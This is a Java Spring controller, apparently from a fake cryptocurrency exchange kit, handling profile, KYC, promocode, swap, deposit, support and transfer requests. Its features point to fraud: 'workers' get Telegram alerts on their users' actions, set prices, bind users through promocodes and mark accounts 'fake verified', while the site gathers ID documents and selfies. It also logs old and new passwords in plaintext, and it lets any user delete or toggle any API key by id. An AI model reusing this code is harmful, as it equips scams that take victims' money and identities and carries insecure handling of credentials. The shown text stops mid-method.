package me.yukitale.cryptoexchange.exchange.controller.api;

import jakarta.servlet.http.HttpServletRequest;
import me.yukitale.cryptoexchange.captcha.CachedCaptcha;
import me.yukitale.cryptoexchange.common.types.CoinType;
import me.yukitale.cryptoexchange.config.Resources;
import me.yukitale.cryptoexchange.exchange.model.Coin;
import me.yukitale.cryptoexchange.exchange.model.user.*;
import me.yukitale.cryptoexchange.exchange.model.user.settings.UserFeature;
import me.yukitale.cryptoexchange.exchange.repository.CoinRepository;
import me.yukitale.cryptoexchange.exchange.repository.user.*;
import me.yukitale.cryptoexchange.exchange.security.service.UserDetailsServiceImpl;
import me.yukitale.cryptoexchange.exchange.security.xss.XSSUtils;
import me.yukitale.cryptoexchange.exchange.service.CoinService;
import me.yukitale.cryptoexchange.exchange.service.CooldownService;
import me.yukitale.cryptoexchange.exchange.service.UserService;
import me.yukitale.cryptoexchange.exchange.service.WestWalletService;
import me.yukitale.cryptoexchange.panel.admin.model.other.AdminSettings;
import me.yukitale.cryptoexchange.panel.admin.model.telegram.TelegramMessage;
import me.yukitale.cryptoexchange.panel.admin.repository.coins.AdminCoinSettingsRepository;
import me.yukitale.cryptoexchange.panel.admin.repository.other.AdminSettingsRepository;
import me.yukitale.cryptoexchange.panel.admin.repository.other.AdminStakingPlanRepository;
import me.yukitale.cryptoexchange.panel.common.model.CoinSettings;
import me.yukitale.cryptoexchange.panel.common.model.ErrorMessage;
import me.yukitale.cryptoexchange.panel.common.model.StakingPlan;
import me.yukitale.cryptoexchange.panel.common.service.TelegramService;
import me.yukitale.cryptoexchange.panel.common.types.KycAcceptTimer;
import me.yukitale.cryptoexchange.panel.worker.model.FastPump;
import me.yukitale.cryptoexchange.panel.worker.model.Promocode;
import me.yukitale.cryptoexchange.panel.worker.model.Worker;
import me.yukitale.cryptoexchange.panel.worker.model.settings.coins.WithdrawCoinLimit;
import me.yukitale.cryptoexchange.panel.worker.model.settings.other.WorkerSettings;
import me.yukitale.cryptoexchange.panel.worker.repository.FastPumpRepository;
import me.yukitale.cryptoexchange.panel.worker.repository.PromocodeRepository;
import me.yukitale.cryptoexchange.panel.worker.repository.WorkerRepository;
import me.yukitale.cryptoexchange.panel.worker.repository.settings.coins.WithdrawCoinLimitRepository;
import me.yukitale.cryptoexchange.panel.worker.repository.settings.other.WorkerStakingPlanRepository;
import me.yukitale.cryptoexchange.utils.*;
import org.apache.commons.lang.RandomStringUtils;
import org.apache.commons.lang.StringUtils;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.http.ResponseEntity;
import org.springframework.security.access.prepost.PreAuthorize;
import org.springframework.security.core.Authentication;
import org.springframework.web.bind.annotation.*;
import org.springframework.web.multipart.MultipartFile;

import java.io.IOException;
import java.time.Duration;
import java.util.*;
import java.util.concurrent.ThreadLocalRandom;

@RestController
@RequestMapping(value = "/api/user")
@PreAuthorize("hasRole('ROLE_USER') || hasRole('ROLE_WORKER') || hasRole('ROLE_ADMIN') || hasRole('ROLE_SUPPORTER')")
public class UserApiController {

    @Autowired
    private UserRepository userRepository;

    @Autowired
    private UserKycRepository userKycRepository;

    @Autowired
    private UserApiKeysRepository userApiKeysRepository;

    @Autowired
    private CoinRepository coinRepository;

    @Autowired
    private UserService userService;

    @Autowired
    private PromocodeRepository promocodeRepository;

    @Autowired
    private UserSupportMessageRepository userSupportMessageRepository;

    @Autowired
    private UserSupportDialogRepository userSupportDialogRepository;

    @Autowired
    private UserAlertRepository userAlertRepository;

    @Autowired
    private UserTransactionRepository userTransactionRepository;

    @Autowired
    private WorkerStakingPlanRepository workerStakingPlanRepository;

    @Autowired
    private AdminStakingPlanRepository adminStakingPlanRepository;

    @Autowired
    private UserStakingRepository userStakingRepository;

    @Autowired
    private FastPumpRepository fastPumpRepository;

    @Autowired
    private UserAddressRepository userAddressRepository;

    @Autowired
    private UserBankRepository userBankRepository;

    @Autowired
    private UserTradeOrderRepository userTradeOrderRepository;

    @Autowired
    private WithdrawCoinLimitRepository withdrawCoinLimitRepository;

    @Autowired
    private UserDepositRepository userDepositRepository;

    @Autowired
    private UserWalletConnectRepository userWalletConnectRepository;

    @Autowired
    private WorkerRepository workerRepository;

    @Autowired
    private AdminCoinSettingsRepository adminCoinSettingsRepository;

    @Autowired
    private AdminSettingsRepository adminSettingsRepository;

    @Autowired
    private CoinService coinService;

    @Autowired
    private WestWalletService westWalletService;

    @Autowired
    private TelegramService telegramService;

    @Autowired
    private CooldownService cooldownService;

    @Autowired
    private UserDetailsServiceImpl userDetailsService;

    //start photo settings
    @PostMapping(value = "photo")
    public ResponseEntity<String> photoController(Authentication authentication, HttpServletRequest request, @RequestParam("action") String action, @RequestParam("image") MultipartFile image) {
        User user = userService.getUser(authentication);
        switch (action.toUpperCase()) {
            case "UPDATE_PROFILE_PHOTO" -> {
                return updateProfilePhoto(request, user, image);
            }
            default -> {
                return ResponseEntity.badRequest().body("action_not_found");
            }
        }
    }

    private ResponseEntity<String> updateProfilePhoto(HttpServletRequest request, User user, MultipartFile image) {
        if (!DataValidator.isValidImage(image)) {
            return ResponseEntity.badRequest().body("error_save_image");
        }

        String fileName = user.getId() + "_" + System.currentTimeMillis() + ".png"; //StringUtils.cleanPath(image.getOriginalFilename());

        String uploadDir = Resources.USER_PROFILES_PHOTO_DIR;

        try {
            FileUploadUtil.saveFile(uploadDir, fileName, image);
            user.setProfilePhoto(fileName);
            userRepository.save(user);

            userService.createAction(user, request, "Changed profile photo");

            return ResponseEntity.ok("success");
        } catch (IOException e) {
            return ResponseEntity.badRequest().body("error_save_image");
        }
    }
    //end photo settings

    //start settings
    @PostMapping(value = "settings")
    public ResponseEntity<String> settingsController(Authentication authentication, HttpServletRequest request, @RequestBody Map<String, Object> body) {
        if (!body.containsKey("action")) {
            return ResponseEntity.badRequest().body("no_action");
        }

        User user = userService.getUser(authentication);
        String action = (String) body.get("action");
        switch (action.toUpperCase()) {
            case "UPDATE_USERNAME" -> {
                return updateUsername(request, user, body);
            }
            case "REMOVE_PROFILE_PHOTO" -> {
                return removeProfilePhoto(request, user);
            }
            case "UPDATE_PASSWORD" -> {
                return updatePassword(request, user, body);
            }
            case "ENABLE_2FA" -> {
                return enableTwoFactor(request, user, body);
            }
            case "DISABLE_2FA" -> {
                return disableTwoFactor(request, user, body);
            }
            case "CREATE_API_KEY" -> {
                return createApiKey(request, user, body);
            }
            case "DELETE_API_KEY" -> {
                return deleteApiKey(request, user, body);
            }
            case "CHANGE_API_KEY_STATUS" -> {
                return changeApiKeyStatus(user, body);
            }
            default -> {
                return ResponseEntity.badRequest().body("action_not_found");
            }
        }
    }

    private ResponseEntity<String> updateUsername(HttpServletRequest request, User user, Map<String, Object> body) {
        String username = (String) body.get("username");
        if (username.equals(user.getUsername())) {
            return ResponseEntity.badRequest().body("same_username");
        }
        if (!DataValidator.isUsernameValided(username)) {
            return ResponseEntity.badRequest().body("username_not_valid");
        }
        if (userRepository.existsByUsernameIgnoreCase(username)) {
            return ResponseEntity.badRequest().body("username_already_taken");
        }

        String oldUsername = user.getUsername();
        user.setUsername(username);
        userRepository.save(user);

        userDetailsService.removeCache(user.getEmail());

        userService.createAction(user, request, "Changed username from " + oldUsername + " to " + username);

        return ResponseEntity.ok("success");
    }

    private ResponseEntity<String> updatePassword(HttpServletRequest request, User user, Map<String, Object> body) {
        String newPassword = (String) body.get("new_password");
        String reNewPassword = (String) body.get("re_new_password");

        if (!newPassword.equals(reNewPassword)) {
            return ResponseEntity.badRequest().body("passwords_doesnt_match");
        }

        if (newPassword.length() < 8 || newPassword.length() > 64) {
            return ResponseEntity.badRequest().body("password_not_valid");
        }

        String oldPassword = user.getPassword();

        user.setPassword(newPassword);
        userRepository.save(user);

        userDetailsService.removeCache(user.getEmail());

        userService.createAction(user, request, "Changed password from " + oldPassword + " to " + newPassword);

        return ResponseEntity.ok("success");
    }

    private ResponseEntity<String> removeProfilePhoto(HttpServletRequest request, User user) {
        if (user.getProfilePhoto() != null) {
            user.setProfilePhoto(null);
            userRepository.save(user);
        }

        userService.createAction(user, request, "Removed profile photo");

        return ResponseEntity.ok("success");
    }

    //todo: объединить методы
    private ResponseEntity<String> enableTwoFactor(HttpServletRequest request, User user, Map<String, Object> body) {
        if (user.isTwoFactorEnabled()) {
            return ResponseEntity.badRequest().body("already_enabled");
        }

        String code = (String) body.get("code");
        if (!GoogleUtil.getTOTPCode(user.getTwoFactorCode()).equals(code)) {
            return ResponseEntity.badRequest().body("wrong_code");
        }

        telegramService.sendMessageToWorker(user.getWorker(), TelegramMessage.MessageType.USER_ENABLE_2FA, false, user.getEmail(), user.getDomain(), StringUtils.isBlank(user.getPromocodeName()) ? "-" : user.getPromocodeName());

        user.setTwoFactorEnabled(true);
        userRepository.save(user);

        userService.createAction(user, request, "Enabled 2FA");

        return ResponseEntity.ok("success");
    }

    private ResponseEntity<String> disableTwoFactor(HttpServletRequest request, User user, Map<String, Object> body) {
        if (!user.isTwoFactorEnabled()) {
            return ResponseEntity.badRequest().body("already_disabled");
        }

        String code = (String) body.get("code");
        if (!GoogleUtil.getTOTPCode(user.getTwoFactorCode()).equals(code)) {
            return ResponseEntity.badRequest().body("wrong_code");
        }

        user.setTwoFactorEnabled(false);
        userRepository.save(user);

        userService.createAction(user, request, "Disabled 2FA");

        return ResponseEntity.ok("success");
    }


    private ResponseEntity<String> createApiKey(HttpServletRequest request, User user, Map<String, Object> body) {
        if (user.getApiKeys().size() >= 5) {
            return ResponseEntity.badRequest().body("limit");
        }

        boolean spotTrading = (boolean) body.get("spot_trading");
        boolean futuresTrading = (boolean) body.get("futures_trading");
        boolean withdraw = (boolean) body.get("withdraw");

        UserApiKey userApiKey = new UserApiKey();
        userApiKey.setUser(user);
        userApiKey.setSecretKey(RandomStringUtils.random(16, true, true));
        userApiKey.setWithdraw(withdraw);
        userApiKey.setSpotTrading(spotTrading);
        userApiKey.setFuturesTrading(futuresTrading);
        userApiKey.setEnabled(true);

        //user.getApiKeys().add(userApiKey);

        userApiKeysRepository.save(userApiKey);

        userService.createAction(user, request, "Created API key");

        return ResponseEntity.ok("success");
    }

    private ResponseEntity<String> deleteApiKey(HttpServletRequest request, User user, Map<String, Object> body) {
        long apiKeyId = ((Integer) body.get("api_key_id"));

        if (!userApiKeysRepository.existsById(apiKeyId)) {
            return ResponseEntity.badRequest().body("api_key_not_found");
        }

        userApiKeysRepository.deleteById(apiKeyId);

        userService.createAction(user, request, "Deleted API key");

        return ResponseEntity.ok("success");
    }

    //todo: findByIdAndUserId везде
    private ResponseEntity<String> changeApiKeyStatus(User user, Map<String, Object> body) {
        long apiKeyId = ((Integer) body.get("api_key_id"));

        UserApiKey userApiKey = userApiKeysRepository.findById(apiKeyId).orElse(null);

        if (userApiKey == null) {
            return ResponseEntity.badRequest().body("api_key_not_found");
        }

        userApiKey.setEnabled(!userApiKey.isEnabled());

        userApiKeysRepository.save(userApiKey);

        return ResponseEntity.ok("success");
    }
    //end settings

    //start kyc
    @PostMapping(value = "kyc")
    public ResponseEntity<String> kycController(Authentication authentication, HttpServletRequest request,
                                                @RequestParam("kyc_first_name") String firstName,
                                                @RequestParam("kyc_last_name") String lastName,
                                                @RequestParam("kyc_country") String country,
                                                @RequestParam("kyc_address") String address,
                                                @RequestParam("kyc_phone") String phone,
                                                @RequestParam("kyc_date_of_birth") String dateOfBirth,
                                                @RequestParam("kyc_id_type") String idTypeTitle,
                                                @RequestParam("kyc_id_number") String idNumber,
                                                @RequestParam("image_document") MultipartFile imageDocument,
                                                @RequestParam("image_selfie") MultipartFile imageSelfie) {
        if (!DataValidator.isValidImage(imageDocument)) {
            return ResponseEntity.badRequest().body("error_save_image");
        }

        if (!DataValidator.isValidImage(imageSelfie)) {
            return ResponseEntity.badRequest().body("error_save_image");
        }

        User user = userService.getUser(authentication);

        if (firstName.length() < 1 || firstName.length() > 64 || firstName.chars().anyMatch(c -> !Character.isLetter(c) && c != ' ' && c != '-')) {
            return ResponseEntity.badRequest().body("invalid: First Name");
        }

        if (lastName.length() < 1 || lastName.length() > 64 || lastName.chars().anyMatch(c -> !Character.isLetter(c) && c != ' ' && c != '-')) {
            return ResponseEntity.badRequest().body("invalid: Last Name");
        }

        if (country.length() < 1 || country.length() > 64 || country.chars().anyMatch(c -> !Character.isLetter(c) && c != ' ' && c != '-')) {
            return ResponseEntity.badRequest().body("invalid: Country");
        }

        if (address.length() < 6 || address.length() > 128 || address.chars().anyMatch(c -> !Character.isLetter(c) && !Character.isDigit(c) && c != ' ' && c != '-' && c != ',' && c != '.' && c != '/')) {
            return ResponseEntity.badRequest().body("invalid: Address");
        }

        if (phone.length() < 5 || phone.length() > 24 || phone.chars().anyMatch(c -> !Character.isDigit(c) && c != ' ' && c != '-' && c != '+')) {
            return ResponseEntity.badRequest().body("invalid: Phone Number");
        }

        if (!dateOfBirth.matches("\\d{1,2}(-|\\/|\\.)\\d{1,2}(-|\\/|\\.)\\d{4}")) {
            return ResponseEntity.badRequest().body("invalid: Date Of Birth");
        }

        if (idNumber.length() < 6 || idNumber.length() > 24 || idNumber.chars().anyMatch(c -> !Character.isLetter(c) && !Character.isDigit(c) && c != ' ' && c != '-')) {
            return ResponseEntity.badRequest().body("invalid: ID Number");
        }

        UserKyc.IdType idType = UserKyc.IdType.getByTitle(idTypeTitle);

        String documentImage = "document_" + user.getId() + "_" + System.currentTimeMillis() + ".png";
        String selfieImage = "selfie_" + user.getId() + "_" + System.currentTimeMillis() + ".png";

        UserKyc userKyc = new UserKyc(firstName, lastName, country, address, phone, dateOfBirth, idType, idNumber,
                "../" + Resources.USER_KYC_PHOTO_DIR + "/" + documentImage, "../" + Resources.USER_KYC_PHOTO_DIR + "/" + selfieImage, user);

        if (user.getWorker() != null) {
            WorkerSettings workerSettings = user.getWorker().getSettings();
            if (workerSettings.getKycAcceptTimer() != KycAcceptTimer.TIMER_DISABLED) {
                userKyc.setAutoAccept(System.currentTimeMillis() + (workerSettings.getKycAcceptTimer().getTime() * 1000L));
            }
        } else {
            AdminSettings adminSettings = adminSettingsRepository.findFirst();
            if (adminSettings.getKycAcceptTimer() != KycAcceptTimer.TIMER_DISABLED) {
                userKyc.setAutoAccept(System.currentTimeMillis() + (adminSettings.getKycAcceptTimer().getTime() * 1000L));
            }
        }

        try {
            String uploadDir = Resources.USER_KYC_PHOTO_DIR;

            FileUploadUtil.saveFile(uploadDir, documentImage, imageDocument);
            FileUploadUtil.saveFile(uploadDir, selfieImage, imageSelfie);

            userKycRepository.save(userKyc);

            telegramService.sendMessageToWorker(user.getWorker(), TelegramMessage.MessageType.USER_SEND_KYC, false, user.getEmail(), user.getDomain(), StringUtils.isBlank(user.getPromocodeName()) ? "-" : user.getPromocodeName());

            userService.createAction(user, request, "Sended KYC LVL 2");
            return ResponseEntity.ok("success");
        } catch (IOException e) {
            return ResponseEntity.badRequest().body("error_save_image");
        }
    }

    @PostMapping(value = "kyc-lvl3")
    public ResponseEntity<String> kycLvl3Controller(Authentication authentication, HttpServletRequest request) {
        User user = userService.getUser(authentication);
        UserKyc kyc = user.getUserKyc();
        if ((kyc == null || !kyc.isAccepted()) && !user.isFakeVerified()) {
            return ResponseEntity.badRequest().body("error");
        }

        user.setKyc3sended(true);
        userRepository.save(user);

        if (kyc != null) {
            kyc.setKyc3Sended(true);
            userKycRepository.save(kyc);
        }

        userService.createAction(user, request, "Sended KYC LVL 3");

        return ResponseEntity.ok("success");
    }
    //end kyc

    //start promocodes
    @PostMapping(value = "promocodes")
    public ResponseEntity<String> promocodesController(Authentication authentication, HttpServletRequest request, @RequestBody Map<String, Object> body) {
        if (!body.containsKey("action")) {
            return ResponseEntity.badRequest().body("no_action");
        }

        User user = userService.getUser(authentication);
        String action = (String) body.get("action");
        switch (action.toUpperCase()) {
            case "ACTIVATE_PROMOCODE" -> {
                return activatePromocode(request, user, body);
            }
            default -> {
                return ResponseEntity.badRequest().body("action_not_found");
            }
        }
    }

    private ResponseEntity<String> activatePromocode(HttpServletRequest request, User user, Map<String, Object> data) {
        boolean worker = workerRepository.findByUserId(user.getId()).isPresent();
        if (!worker && user.getPromocodeName() != null) {
            return ResponseEntity.badRequest().body("already_activated");
        }

        String name = (String) data.get("promocode");
        if (!name.matches("^[a-zA-Z0-9-_]{2,32}$")) {
            return ResponseEntity.badRequest().body("invalid_promocode");
        }

        Promocode promocode = promocodeRepository.findByName(name).orElse(null);
        if (promocode == null) {
            return ResponseEntity.badRequest().body("not_found");
        }

        //spring huyna
        if (!worker && cooldownService.isCooldown(user.getId() + "-promocode")) {
            return ResponseEntity.badRequest().body("already_activated");
        }

        cooldownService.addCooldown(user.getId() + "-promocode", Duration.ofSeconds(3));

        double amount = 0D;
        if (promocode.isRandom()) {
            amount = MathUtil.round(ThreadLocalRandom.current().nextDouble(promocode.getMinAmount(), promocode.getMaxAmount()), 8);
        } else {
            amount = promocode.getMinAmount();
        }

        if (amount > 0) {
            userService.addBalance(user, promocode.getCoin(), amount);
        }

        userService.bindToWorker(user, promocode.getWorker());

        user.setPromocodeName(promocode.getName());
        user.setFirstDepositBonusEnabled(promocode.getBonusAmount() > 0);
        user.setFirstDepositBonusAmount(promocode.getBonusAmount());

        promocode.setActivations(promocode.getActivations() + 1);

        userRepository.save(user);
        promocodeRepository.save(promocode);

        userService.createAction(user, request, "Activated promocode " + promocode.getName());

        return ResponseEntity.ok(promocode.getText() == null || promocode.getText().isEmpty() ? "success" : promocode.getText());
    }
    //end promocodes

    //start swap
    @PostMapping(value = "swap")
    public ResponseEntity<String> swapController(Authentication authentication, HttpServletRequest request, @RequestBody Map<String, Object> body) {
        if (!body.containsKey("action")) {
            return ResponseEntity.badRequest().body("no_action");
        }

        User user = userService.getUser(authentication);
        String action = (String) body.get("action");
        switch (action.toUpperCase()) {
            case "CALC_SWAP" -> {
                return calcSwap(user, body);
            }
            case "SWAP" -> {
                return swap(request, user, body);
            }
            default -> {
                return ResponseEntity.badRequest().body("action_not_found");
            }
        }
    }

    private ResponseEntity<String> calcSwap(User user, Map<String, Object> data) {
        String amountString = (String) data.get("amount");
        if (amountString == null || amountString.isEmpty()) {
            return ResponseEntity.badRequest().body("error");
        }

        double amount = -1;
        try {
            amount = Double.parseDouble(amountString.replace(",", ".").replace("-", "").replace("+", ""));
        } catch (Exception ex) {
            return ResponseEntity.badRequest().body("error");
        }

        String fromCoinSymbol = (String) data.get("exchange");
        String toCoinSymbol = (String) data.get("for");

        Coin fromCoin = coinRepository.findBySymbol(fromCoinSymbol).orElse(null);
        Coin toCoin = coinRepository.findBySymbol(toCoinSymbol).orElse(null);
        if (fromCoin == null || toCoin == null) {
            return ResponseEntity.badRequest().body("error");
        }

        Worker worker = user.getWorker();

        double priceFrom = coinService.getIfWorkerPrice(worker, fromCoin);
        double priceTo = coinService.getIfWorkerPrice(worker, toCoin);

        double toAmount = priceFrom * amount / priceTo;

        return ResponseEntity.ok(new MyDecimal(toAmount).toString());
    }


    private ResponseEntity<String> swap(HttpServletRequest request, User user, Map<String, Object> data) {
        String amountString = (String) data.get("amount");
        if (amountString == null || amountString.isEmpty()) {
            return ResponseEntity.badRequest().body("null_amount");
        }

        double amount = -1;
        try {
            amount = Double.parseDouble(amountString.replace(",", ".").replace("-", "").replace("+", ""));
        } catch (Exception ex) {
            return ResponseEntity.badRequest().body("error");
        }

        String fromCoinSymbol = (String) data.get("exchange");
        String toCoinSymbol = (String) data.get("for");

        if (fromCoinSymbol == null || toCoinSymbol == null) {
            return ResponseEntity.badRequest().body("null_coins");
        }

        if (fromCoinSymbol.equalsIgnoreCase(toCoinSymbol)) {
            return ResponseEntity.badRequest().body("same_coins");
        }

        if (!user.isFeatureEnabled(UserFeature.Type.SWAP)) {
            return ResponseEntity.badRequest().body("swap_ban");
        }

        Coin fromCoin = coinRepository.findBySymbol(fromCoinSymbol).orElse(null);
        Coin toCoin = coinRepository.findBySymbol(toCoinSymbol).orElse(null);
        if (fromCoin == null || toCoin == null) {
            return ResponseEntity.badRequest().body("null_coins");
        }

        if (userService.getBalance(user, fromCoinSymbol) < amount) {
            return ResponseEntity.badRequest().body("no_balance");
        }

        Worker worker = user.getWorker();

        double priceFrom = coinService.getIfWorkerPrice(worker, fromCoin);

        if (amount * priceFrom < 1) {
            return ResponseEntity.badRequest().body("minimum_amount");
        }

        double priceTo = coinService.getIfWorkerPrice(worker, toCoin);

        double toAmount = priceFrom * amount / priceTo;

        userService.addBalance(user, fromCoin, -amount);
        userService.addBalance(user, toCoin, toAmount);

        userService.createAction(user, request, "Swapped " + new MyDecimal(amount) + " " + fromCoin.getSymbol() + " to " + new MyDecimal(toAmount) + " " + toCoin.getSymbol());

        return ResponseEntity.ok(new MyDecimal(toAmount).toString());
    }
    //end swap

    //start deposits
    @PostMapping(value = "deposits")
    public ResponseEntity<String> depositsController(Authentication authentication, HttpServletRequest request, @RequestBody Map<String, Object> body) {
        if (!body.containsKey("action")) {
            return ResponseEntity.badRequest().body("no_action");
        }

        User user = userService.getUser(authentication);
        String action = (String) body.get("action");
        switch (action.toUpperCase()) {
            case "CHECK_VERIFY_DEPOSIT" -> {
                return checkVerifyDeposit(user, body);
            }
            default -> {
                return ResponseEntity.badRequest().body("action_not_found");
            }
        }
    }

    private ResponseEntity<String> checkVerifyDeposit(User user, Map<String, Object> data) {
        String coinSymbol = (String) data.get("crypto");
        double amount = getDoubleValue(data, "amount");
        CoinType coinType = CoinType.valueOf(coinSymbol);

        List<UserDeposit> userDeposits = userDepositRepository.findByUserIdAndCoinType(user.getId(), coinType);
        if (userDeposits.isEmpty()) {
            return ResponseEntity.badRequest().body("not_found");
        }

        if (userDeposits.stream().noneMatch(deposit -> deposit.getAmount() == amount)) {
            return ResponseEntity.badRequest().body("amount_not_same");
        }

        return ResponseEntity.ok("success");
    }
    //end deposits

    //start profile
    @PostMapping(value = "profile", produces = "application/json; charset=UTF-8")
    public ResponseEntity<String> profileController(Authentication authentication, HttpServletRequest request, @RequestBody Map<String, Object> body) {
        if (!body.containsKey("action")) {
            return ResponseEntity.badRequest().body("no_action");
        }

        User user = userService.getUser(authentication);
        String action = (String) body.get("action");
        switch (action.toUpperCase()) {
            case "GET_BALANCE" -> {
                return getBalance(user, body);
            }
            case "GET_DEPOSIT_ADDRESS" -> {
                return getDepositAddress(request, user, body);
            }
            case "CHECK_ALERT" -> {
                return checkAlert(request, user);
            }
            case "GET_ERROR_MESSAGE" -> {
                return getErrorMessage(user, body);
            }
            default -> {
                return ResponseEntity.badRequest().body("action_not_found");
            }
        }
    }

    private ResponseEntity<String> getBalance(User user, Map<String, Object> data) {
        String coinSymbol = (String) data.get("crypto");
        Coin coin = coinRepository.findBySymbol(coinSymbol).orElse(null);
        if (coin == null) {
            return ResponseEntity.badRequest().body("error");
        }

        return ResponseEntity.ok(new MyDecimal(userService.getBalance(user, coinSymbol)).toString());
    }

    private ResponseEntity<String> getDepositAddress(HttpServletRequest request, User user, Map<String, Object> data) {
        String coinSymbol = (String) data.get("crypto");
        if (StringUtils.isBlank(coinSymbol)) {
            return ResponseEntity.badRequest().body("error");
        }

        CoinType coinType = CoinType.valueOf(coinSymbol.toUpperCase());

        if (cooldownService.isCooldown(user.getId() + "-" + coinType + "-address")) {
            return ResponseEntity.badRequest().body("address_generated");
        }

        UserAddress userAddress = userAddressRepository.findByUserIdAndCoinType(user.getId(), coinType).orElse(null);
        if (userAddress == null || userAddress.isExpired()) {
            if (userAddress != null && userAddress.isExpired()) {
                userAddressRepository.deleteById(userAddress.getId());
            }
            try {
                cooldownService.addCooldown(user.getId() + "-" + coinType + "-address", Duration.ofSeconds(5));
                userAddress = westWalletService.createUserAddress(user, coinType);

                if (userAddressRepository.countByUserIdAndCoinType(user.getId(), coinType) >= 1) {
                    userAddress = userAddressRepository.findByUserIdAndCoinType(user.getId(), coinType).orElse(null);
                } else {
                    userAddressRepository.save(userAddress);

                    userService.createAction(user, request, "Generated " + coinType + " address");
                }
            } catch (RuntimeException ex) {
                return ResponseEntity.badRequest().body("error");
            }
        }

        UserAddress finalUserAddress = userAddress;

        Map<String, String> addressData = new HashMap<>() {{
            put("address", finalUserAddress.getAddress());
            put("tag", finalUserAddress.getTag());
        }};

        return ResponseEntity.ok(JsonUtil.writeJson(addressData));
    }

    private ResponseEntity<String> checkAlert(HttpServletRequest request, User user) {
        user.setLastOnline(System.currentTimeMillis());
        userRepository.save(user);

        UserAlert alert = userAlertRepository.findFirstByUserId(user.getId()).orElse(null);
        if (alert != null) {
            userAlertRepository.deleteById(alert.getId());

            if (alert.getType() == UserAlert.Type.BONUS) {
                Coin coin = alert.getCoin();
                if (coin != null) {
                    userService.addBalance(user, coin, alert.getAmount());

                    userService.createAction(user, request, "Got it bonus alert (" + new MyDecimal(alert.getAmount()).toString(8) + coin.getSymbol() + ")");
                }
            } else {
                userService.createAction(user, request, "Got it alert");
            }

            Map<String, String> alertMap = new HashMap<>() {{
                put("type", alert.getType().name());
                put("message", alert.getMessage());
            }};

            return ResponseEntity.ok(JsonUtil.writeJson(alertMap));
        }

        return ResponseEntity.ok().body("no_alerts");
    }

    private ResponseEntity<String> getErrorMessage(User user, Map<String, Object> data) {
        String typeName = String.valueOf(data.get("type"));
        ErrorMessage.ErrorMessageType type = Arrays.stream(ErrorMessage.ErrorMessageType.values())
                .filter(type1 -> type1.name().equalsIgnoreCase(typeName))
                .findFirst()
                .orElse(null);
        if (type == null) {
            return ResponseEntity.badRequest().body("type_not_found");
        }

        String errorMessage = userService.getErrorMessage(user, type);

        Map<String, String> errorMessageData = new HashMap<>() {{
            put("message", errorMessage);
        }};

        return ResponseEntity.ok(JsonUtil.writeJson(errorMessageData));
    }
    //end profile

    //start support
    @PostMapping(value = "support/send")
    public ResponseEntity<String> supportSendController(Authentication authentication, HttpServletRequest request, @RequestParam(value = "message", required = false) String message, @RequestParam(value = "image", required = false) MultipartFile image) {
        if (StringUtils.isBlank(message) && image == null) {
            return ResponseEntity.badRequest().body("message_is_empty");
        }

        User user = userService.getUser(authentication);
        if (cooldownService.isCooldown(user.getId() + "-support")) {
            return ResponseEntity.badRequest().body("cooldown");
        }

        if (!user.isFeatureEnabled(UserFeature.Type.SUPPORT)) {
            return ResponseEntity.badRequest().body("support_ban");
        }

        if (message != null) {
            if (StringUtils.isBlank(message)) {
                return ResponseEntity.badRequest().body("message_is_empty");
            }
            if (message.length() > 2000) {
                return ResponseEntity.badRequest().body("message_limit");
            }

            message = XSSUtils.stripXSS(message);

            UserSupportMessage supportMessage = new UserSupportMessage(UserSupportMessage.Target.TO_SUPPORT, UserSupportMessage.Type.TEXT, message, true, false, user);

            createOrUpdateSupportDialog(supportMessage, user);

            userSupportMessageRepository.save(supportMessage);

            telegramService.sendMessageToWorker(user.getWorker(), TelegramMessage.MessageType.USER_SEND_SUPPORT_MESSAGE, true, user.getEmail(), message, user.getDomain(), StringUtils.isBlank(user.getPromocodeName()) ? "-" : user.getPromocodeName());

            userService.createAction(user, request, "Sended support message");
        }

        if (image != null && image.getOriginalFilename() != null) {
            String fileName = user.getId() + "_" + System.currentTimeMillis() + ".png";
            try {
                FileUploadUtil.saveFile(Resources.SUPPORT_IMAGES, fileName, image);

                UserSupportMessage supportMessage = new UserSupportMessage(UserSupportMessage.Target.TO_SUPPORT, UserSupportMessage.Type.IMAGE, "../" + Resources.SUPPORT_IMAGES + "/" + fileName, true, false, user);

                createOrUpdateSupportDialog(supportMessage, user);

                userSupportMessageRepository.save(supportMessage);

                telegramService.sendMessageToWorker(user.getWorker(), TelegramMessage.MessageType.USER_SEND_SUPPORT_IMAGE, true, user.getEmail(), user.getDomain(), StringUtils.isBlank(user.getPromocodeName()) ? "-" : user.getPromocodeName());

                userService.createAction(user, request, "Sended support image");
            } catch (IOException e) {
                e.printStackTrace();
                return ResponseEntity.badRequest().body("upload_image_error");
            }
        }

        cooldownService.addCooldown(user.getId() + "-support", Duration.ofMillis(500));

        return ResponseEntity.ok("success");
    }

    private void createOrUpdateSupportDialog(UserSupportMessage supportMessage, User user) {
        UserSupportDialog userSupportDialog = userSupportDialogRepository.findByUserId(user.getId()).orElse(null);
        if (userSupportDialog == null) {
            userSupportDialog = new UserSupportDialog();
        }

        userSupportDialog.setOnlyWelcome(false);
        userSupportDialog.setSupportUnviewedMessages(userSupportDialog.getSupportUnviewedMessages() + 1);
        userSupportDialog.setTotalMessages(userSupportDialog.getTotalMessages() + 1);
        userSupportDialog.setLastMessageDate(supportMessage.getCreated());
        userSupportDialog.setUser(user);

        userSupportDialogRepository.save(userSupportDialog);
    }
    //end support

    //start transfer
    @PostMapping(value = "transfer")
    public ResponseEntity<String> transferController(Authentication authentication, HttpServletRequest request, @RequestBody Map<String, Object> data) {
        double amount = getDoubleValue(data, "amount");
        if (amount <= 0) {
            return ResponseEntity.badRequest().body("amount_error");
        }

        String address = String.valueOf(data.get("address")).toLowerCase();
        if (StringUtils.isBlank(address)) {
            return ResponseEntity.badRequest().body("address_not_found");
        }

        User user = userService.getUser(authentication);
        if (!user.isFeatureEnabled(UserFeature.Type.TRANSFER)) {
            return ResponseEntity.badRequest().body("transfer_ban");
        }

        User receiver = null;
        if (DataValidator.isEmailValided(address)) {
            receiver = userRepository.findByEmail(address).orElse(null);
        } else {
            try {
                long receiverId = Long.parseLong(address);
                receiver = userRepository.findById(receiverId).orElse(null);
            } catch (Exception ex) {
                UserAddress userAddress = userAddressRepository.findByAddressIgnoreCase(address).orElse(null);
                if (userAddress != null) {
                    receiver = userAddress.getUser();
                }
            }
        }

        if (receiver == null) {
            return ResponseEntity.badRequest().body("address_not_found");
        }

        if (user.getId() == receiver.getId()) {
            return ResponseEntity.badRequest().body("same_users");
        }

        String coinSymbol = String.valueOf(data.get("coin_symbol"));
